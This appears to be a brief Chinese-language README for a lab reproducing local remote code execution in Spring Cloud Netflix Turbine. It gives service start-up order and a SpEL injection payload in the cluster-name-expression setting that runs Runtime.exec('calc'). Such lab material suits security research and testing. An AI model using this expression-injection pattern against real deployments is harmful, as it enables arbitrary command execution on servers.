# spring-cloud-starter-netflix-turbine

启动顺序:

1. 启动registry
2. 启动servicea,serivceb
3. 启动dashboard
4. 启动turbine

## 本地RCE

等待片刻时间，会触发turbine下application.yml中的turbine.cluster-name-expression表达式

```
turbine.cluster-name-expression=T(Runtime).getRuntime().exec('calc')
```

